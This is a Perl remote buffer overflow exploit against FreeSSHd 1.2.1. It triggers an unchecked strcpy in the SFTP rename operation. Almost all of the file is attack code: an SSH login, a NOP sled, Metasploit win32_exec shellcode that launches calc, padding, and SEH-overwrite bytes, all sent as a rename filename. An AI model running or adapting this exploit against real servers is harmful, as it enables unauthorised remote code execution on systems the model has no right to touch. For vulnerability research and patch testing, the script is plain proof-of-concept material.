# FreeSSHd 1.2.1 (rename) Remote Buffer Overflow Exploit
#
# Test box: WinXP Pro SP2 English
#
# Exploit code for a vulnerability I discovered sometime
# ago in FreeSSHd 1.2.1. This code should be run from a 
# user titled "root", or adjust the payload for your 
# username. I've left space for adjustments. Up to the
# first six NOPs can be used (inclusive). 
#
# The code exploits a vulnerability in the SFTP Rename
# operation. The vulnerability was patched in 1.2.2
#
# 00416F98  50             PUSH EAX                      
# 00416F99  8D85 B8FEFFFF  LEA EAX,DWORD PTR SS:[EBP-148]
# 00416F9F  50             PUSH EAX                      
# 00416FA0  E8 45B50400    CALL <JMP.&MSVCRT.strcpy>     

use Net::SSH2;

my $user = "root";
my $pass = "root";

my $ip = "127.0.0.1";
my $port = 22;

my $ssh2 = Net::SSH2->new();

print "[+] Connecting...\n";
$ssh2->connect($ip, $port) || die "[-] Unable to connect!\n";
$ssh2->auth_password($user, $pass) || "[-] Incorrect credentials\n";
print "[+] Sending payload\n";

$nop = "\x90";
$padding = 'A' x 105;

my $SEH = "\x21\x11\x40\x00"; # pop, pop, ret - 0x00401121 (Universal - freeSSHdServer.exe)
my $nextSEH = "\xEB\xF0\x90\x90"; # jmp short 240, nop, nop

$mShellcode = "\xE9\xF2\xFE\xFF\xFF";

# win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub - metasploit.com
my $shellcode =
"\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02".
"\x28\x29\x10\x83\xeb\xfc\xe2\xf4\xfe\xc0\x6d\x10\x02\x28\xa2\x55".
"\x3e\xa3\x55\x15\x7a\x29\xc6\x9b\x4d\x30\xa2\x4f\x22\x29\xc2\x59".
"\x89\x1c\xa2\x11\xec\x19\xe9\x89\xae\xac\xe9\x64\x05\xe9\xe3\x1d".
"\x03\xea\xc2\xe4\x39\x7c\x0d\x14\x77\xcd\xa2\x4f\x26\x29\xc2\x76".
"\x89\x24\x62\x9b\x5d\x34\x28\xfb\x89\x34\xa2\x11\xe9\xa1\x75\x34".
"\x06\xeb\x18\xd0\x66\xa3\x69\x20\x87\xe8\x51\x1c\x89\x68\x25\x9b".
"\x72\x34\x84\x9b\x6a\x20\xc2\x19\x89\xa8\x99\x10\x02\x28\xa2\x78".
"\x3e\x77\x18\xe6\x62\x7e\xa0\xe8\x81\xe8\x52\x40\x6a\x56\xf1\xf2".
"\x71\x40\xb1\xee\x88\x26\x7e\xef\xe5\x4b\x48\x7c\x61\x28\x29\x10";

my $payload = $nop x 6 . $shellcode . $padding . $mShellcode . $nop x 9 . $nextSEH . $SEH;

my $sftp = $ssh2->sftp();
$sftp->rename($payload, 'B');

print "[+] Sent";
$ssh2->disconnect;
